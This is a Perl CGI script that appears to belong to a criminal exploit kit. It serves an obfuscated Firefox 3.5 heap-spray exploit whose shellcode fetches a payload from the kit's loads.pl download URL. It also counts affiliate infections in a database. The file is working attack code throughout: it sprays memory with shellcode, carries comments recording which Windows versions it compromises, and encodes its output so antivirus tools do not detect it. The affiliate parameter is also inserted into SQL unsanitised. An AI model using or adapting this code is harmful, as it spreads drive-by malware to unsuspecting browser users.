#!/usr/bin/perl

#
# base64 encoder for firefox 3.5 escape retval exploit
# TESTED WIndows XP SP3 (WORKING)
# TESTED Windows XP SP2 (WORKING)
# TESTED Windows 2003 SP2 (NOT WORKING / Shellcode doesn't exec)
# FUD: base64 random space injection + Random Vars
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/EncBase.pm";
require "../lib/JsXOR.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit
$sql = "UPDATE exploits SET mozilla35=mozilla35+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');

#Insert the view param on exploit
$sql = "UPDATE exploits SET mozilla35=mozilla35+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#random string
$str1 = JsXOR::generate_random_string(int(rand 20));
$str2 = JsXOR::generate_random_string(int(rand 20));
$str3 = JsXOR::generate_random_string(int(rand 20));

#build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=mozilla35';
$shellcode = Shellcode::getshell($urlllll);

my $data = <<EOF;

<html>
<head>
<div id="content">
<p>
<FONT>                             
</FONT>
</p>
<p>
<FONT>$str1</FONT></p>
<p>
<FONT>$str2</FONT>
</p>
<p>
<FONT>$str3</FONT>
</p>
</div>

<script language="JavaScript">

var xunescape = unescape;
var shellcode = xunescape("$shellcode");

oneblock = xunescape("%u0c0c%u0c0c");

var fullblock = oneblock;
while (fullblock.length < 393216)  
{
    fullblock += fullblock;
}

var sprayContainer = new Array();
var sprayready = false;
var sprayContainerIndex = 0;

function fill_function() 
{
	if(! sprayready) {
		for (xi=0; xi<800/100; xi++, sprayContainerIndex++)
		{
			sprayContainer[sprayContainerIndex] = fullblock + shellcode;
		}
	} else {
		DataTranslator();
		GenerateHTML();
	}
	if(sprayContainer.length >= 800) {
		sprayready = true;
	}
}

var searchArray = new Array();
 
function escapeData(data)
{
 var xi;
 var xc;
 var escData='';
 for(xi=0; xi<data.length; xi++)
  {
   xc=data.charAt(xi);
   if(xc=='&' || xc=='?' || xc=='=' || xc=='%' || xc==' ') xc = escape(xc);
   escData+=xc;
  }
 return escData;
}
 
function DataTranslator() 
{
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["$str1"] = "$str2";
    var newElement = document.getElementById("content");
    if (document.getElementsByTagName) {
        var xi=0;
        pTags = newElement.getElementsByTagName("p");
        if (pTags.length > 0)  
        	while (xi < pTags.length)
        	{
            	oTags = pTags[xi].getElementsByTagName("font");
            	searchArray[xi+1] = new Array();
            	if (oTags[0])   {
                	searchArray[xi+1]["$str1"] = oTags[0].innerHTML;
            	}
            	xi++;
        	}
    }
}
 
function GenerateHTML()
{
    var xhtml = "";
    for (xi=1;xi<searchArray.length;xi++)
    {
        xhtml += escapeData(searchArray[xi]["$str1"]);
    }    
}

setInterval("fill_function()", .5);

</script>
</body>
</html>


EOF


$allencodespaced = EncBase::randombase($data);


###### BEGIN PRINT EXPLOIT #########
print $q->header;

print $allencodespaced;
####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
